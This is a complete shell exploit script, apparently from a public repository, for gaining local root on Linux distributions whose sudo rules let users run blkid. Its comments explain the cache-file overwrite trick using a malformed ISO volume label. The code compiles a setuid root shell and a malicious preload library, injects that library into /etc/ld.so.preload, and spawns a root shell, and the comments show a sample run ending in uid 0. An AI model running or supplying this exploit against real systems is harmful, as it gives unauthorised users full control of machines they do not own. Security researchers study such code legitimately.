#!/bin/sh
# sudo-blkid-root local root exploit
#
# Requires execution within the context of a user session
# with an active PolKit agent. Uses ld.so.preload technique.
# ---
# The default sudo configuration on some Linux distributions permits
# low-privileged users to execute blkid as root. A few examples:
#
# - antiX 19
# - MX Linux 19
# - Emmabuntüs DE 3
#
# This configuration is unsafe, as blkid allows users to specify the `-c` flag
# to write cache data to file, allowing clobbering of arbitrary files.
#
# The cache file contents are not fully fully user-controlled; however,
# the data can be partially controlled via mounted volume labels.
#
#   $ genisoimage -r -V "`echo -e 'harmless\na new line\n'`" -cache-inodes -J -l -o test.iso test
#   I: -input-charset not specified, using utf-8 (detected in locale settings)
#   Total translation table size: 0
#   Total rockridge attributes bytes: 169
#   Total directory bytes: 238
#   Path table size(bytes): 10
#   Max brk space used 0
#   181 extents written (0 MB)
#   $ file test.iso
#   test.iso: ISO 9660 CD-ROM filesystem data 'harmless'
#   $ strings test.iso | grep harmless -A 1
#   LINUX                           harmless
#   a new line
#
# blkid attempts to validate mounted volume labels,
# by replacing unexpected characters with underscores:
#
#   $ /usr/bin/udisksctl loop-setup -f test.iso
#   Mapped file test.iso as /dev/loop16.
#   $ sudo blkid -c output | grep loop16
#   /dev/loop16: UUID="2020-03-15-02-40-38-00" LABEL="harmless_a new l" TYPE="iso9660"
#   $ grep loop16 output
#   <device DEVNO="0x0710" TIME="1584200921.653410" UUID="2020-03-15-02-40-38-00" LABEL="harmless_a new l" TYPE="iso9660">/dev/loop16</device>
#
# However, by mounting a malformed ISO and running blkid with the `-c` flag,
# it is possible to overwrite and inject newlines into arbitrary files with
# the blkid cache data.
#
#   $ sed -i 's/GENISOIMAGE//g' test.iso         # corrupt the ISO segments
#   $ /usr/bin/udisksctl loop-setup -f test.iso  # mount the ISO file
#   Mapped file test.iso as /dev/loop17.
#   $ sudo blkid -c output | grep loop17
#   /dev/loop17: UUID="3800-,0-00-00-00-00-00" LABEL="harmless^Ja new line" TYPE="iso9660"
#   $ grep loop17 output
#   a new line" TYPE="iso9660">/dev/loop17</device>
#
# This exploit overwrites /etc/ld.so.preload with blkid cache data,
# allowing privileged execution of an arbitrary shared object file,
# resulting in privilege escalation to root.
# ---
#  $ ./sudo-blkid-root
#  [*] Checking environment ...
#  blkid from util-linux 2.33.1  (libblkid 2.33.1, 09-Jan-2019)
#  [*] Compiling ...
#  [*] Generating /tmp/test.iso ISO file ...
#  I: -input-charset not specified, using utf-8 (detected in locale settings)
#  Total translation table size: 0
#  Total rockridge attributes bytes: 169
#  Total directory bytes: 238
#  Path table size(bytes): 10
#  Max brk space used 0
#  181 extents written (0 MB)
#  /tmp/test.iso: ISO 9660 CD-ROM filesystem data 'harmless'
#  [*] Mounting /tmp/test.iso ISO file ...
#  Mapped file /tmp/test.iso as /dev/loop0.
#  [*] Adding /tmp/libblkid.so to /etc/ld.so.preload ...
#  /dev/sda1: LABEL="rootMX19" UUID="5bfb0cd0-e420-4002-84f6-a8b1ce7f9002" TYPE="ext4" PARTUUID="6dc6be42-01"
#  /dev/sda2: LABEL="swapMX" UUID="011e8884-85cd-4108-8c84-edeeb9e1ae3b" TYPE="swap" PARTUUID="6dc6be42-02"
#  /dev/loop0: UUID="6080-0M-p-00-00-00-00-00" LABEL="harmless^J/tmp/libblkid.so^J." TYPE="iso9660"
#  ERROR: ld.so: object '<device' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
#  ERROR: ld.so: object 'DEVNO="0x0801"' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
#  ERROR: ld.so: object 'TIME="1570370768.794835"' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
#  ERROR: ld.so: object 'LABEL="rootMX19"' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
#  ERROR: ld.so: object 'UUID="5bfb0cd0-e420-4002-84f6-a8b1ce7f9002"' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
#  ERROR: ld.so: object 'TYPE="ext4"' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
#  ERROR: ld.so: object 'PARTUUID="6dc6be42-01">/dev/sda1</device>' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
#  ERROR: ld.so: object '<device' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
#  ERROR: ld.so: object 'DEVNO="0x0802"' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
#  ERROR: ld.so: object 'TIME="1570370768.799621"' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
#  ERROR: ld.so: object 'LABEL="swapMX"' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
#  ERROR: ld.so: object 'UUID="011e8884-85cd-4108-8c84-edeeb9e1ae3b"' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
#  ERROR: ld.so: object 'TYPE="swap"' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
#  ERROR: ld.so: object 'PARTUUID="6dc6be42-02">/dev/sda2</device>' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
#  ERROR: ld.so: object '<device' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
#  ERROR: ld.so: object 'DEVNO="0x0700"' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
#  ERROR: ld.so: object 'TIME="1570370768.870097"' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
#  ERROR: ld.so: object 'UUID="6080-0�-00-00-00-00-00"' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
#  ERROR: ld.so: object 'LABEL="harmless' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
#  ERROR: ld.so: object '."' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
#  ERROR: ld.so: object 'TYPE="iso9660">/dev/loop0</device>' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
#  [+] Success:
#  -rwsr-xr-x 1 root root 16712 Oct  6 10:06 /tmp/.sh
#  [*] Cleaning up ...
#  root@mx-19b3:~/Desktop
#  # id
#  uid=0(root) gid=0(root) groups=0(root),7(lp),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),109(netdev),111(lpadmin),118(scanner),125(vboxsf),1000(user)
# ---
# <bcoles@gmail.com>
# https://github.com/bcoles/local-exploits/tree/master/sudo-blkid-root

rootshell="/tmp/.sh"
lib_path="/tmp/libblkid"
iso_path="/tmp/test"

command_exists() {
  command -v "${1}" >/dev/null 2>/dev/null
}

/bin/echo "[*] Checking environment ..."

if ! command_exists gcc; then
  /bin/echo '[-] gcc is not installed'
  exit 1
fi

if ! command_exists sudo; then
  /bin/echo '[-] sudo is not installed'
  exit 1
fi

if ! command_exists genisoimage; then
  /bin/echo '[-] genisoimage is not installed'
  exit 1
fi

if ! command_exists udisksctl; then
  /bin/echo '[-] udisksctl is not installed'
  exit 1
fi

if ! command_exists sed; then
  /bin/echo '[-] sed is not installed'
  exit 1
fi

if ! /usr/bin/sudo /sbin/blkid -V | grep "libblkid"; then
  /bin/echo '[-] User is not permitted to execute blkid with sudo'
  exit 1
fi

if ! /bin/loginctl --no-ask-password show-session "${XDG_SESSION_ID}" | grep -q Remote=no; then
  /bin/echo '[-] User session does not have an active PolKit session. Mounting ISO file will fail.'
  exit 1
fi

/bin/echo "[*] Compiling ..."

/bin/cat > "${rootshell}.c" << "EOF"
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
  setuid(0);
  setgid(0);
  execl("/bin/bash", "bash", NULL);
}
EOF

if ! gcc "${rootshell}.c" -o "${rootshell}"; then
  /bin/echo "[-] Compiling ${rootshell}.c failed"
  exit 1
fi

/bin/rm "${rootshell}.c"

/bin/cat > "${lib_path}.c" << "EOF"
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
void init(void) __attribute__((constructor));
void __attribute__((constructor)) init() {
  if (setuid(0) || setgid(0))
    _exit(1);
  unlink("/etc/ld.so.preload");
  unlink("/etc/ld.so.preload.old");
  system("chown root:root /tmp/.sh");
  system("chmod u+s /tmp/.sh");
  _exit(0);
}
EOF

if ! gcc "${lib_path}.c" -fPIC -shared -o "${lib_path}.so"; then
  /bin/echo "[-] Compiling ${lib_path} failed"
  exit 1
fi

/bin/rm "${lib_path}.c"

/bin/echo "[*] Generating ${iso_path}.iso ISO file ..."

/bin/mkdir -p "${iso_path}"

if ! /usr/bin/genisoimage -r -V "`/bin/echo -e "harmless\n${lib_path}.so\n."`" -cache-inodes -J -l -o "${iso_path}.iso" "${iso_path}"; then
  /bin/echo "[-] Generating ${iso_path}.iso failed"
  /bin/rmdir "${iso_path}"
  /bin/rm "${lib_path}.so"
  /bin/rm "${rootshell}"
  exit 1
fi

/bin/rmdir "${iso_path}"

/bin/sed -i 's/GENISOIMAGE//g' "${iso_path}.iso"

/usr/bin/file "${iso_path}.iso"

/bin/echo "[*] Mounting ${iso_path}.iso ISO file ..."

if ! /usr/bin/udisksctl loop-setup -f "${iso_path}.iso"; then
  /bin/echo "[-] Mounting ${iso_path}.iso failed"
  /bin/rm "${lib_path}.so"
  /bin/rm "${rootshell}"
fi

/bin/echo "[*] Adding ${lib_path}.so to /etc/ld.so.preload ..."

/usr/bin/sudo /sbin/blkid -c /etc/ld.so.preload

/usr/bin/sudo /sbin/blkid

if ! test -u "${rootshell}"; then
  /bin/echo "[-] Failed to set ${rootshell} setuid."
  /bin/rm "${iso_path}.iso"
  /bin/rm "${lib_path}.so"
  /bin/rm "${rootshell}"
  exit 1
fi

/bin/echo '[+] Success:'
ls -la "${rootshell}"

/bin/echo '[*] Cleaning up ...'
/bin/rm "${iso_path}.iso"
/bin/rm "${lib_path}.so"

/bin/sh -c "${rootshell}"

